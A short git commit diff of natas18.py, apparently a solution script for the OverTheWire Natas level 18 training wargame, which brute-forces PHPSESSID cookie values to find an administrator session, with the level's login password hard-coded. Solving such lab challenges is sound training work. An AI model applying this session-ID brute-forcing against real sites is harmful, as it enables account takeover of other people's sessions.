83c2630bb246f47c3ab1dda5041f4c96c00f0ddf
secjits <secjits@gmail.com>
2017-01-09 18:19:18 -0800

    Update natas18.py

--- natas18.py
+++ natas18.py
@@ -1,9 +1,7 @@
 import requests
 
 for i in range(640):
-        _jar = requests.cookies.RequestsCookieJar()
-        _jar.set('PHPSESSID', str(i), domain='natas18.natas.labs.overthewire.org', path='/home/')
-	#jar = dict(PHPSESSID=str(i))
+        _jar = dict(PHPSESSID=str(i))
 	c = requests.get('http://natas18.natas.labs.overthewire.org', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies=_jar)
 	if c.text.find("You are an admin.") != -1:
 		print "Here's our fella: " + str(i)
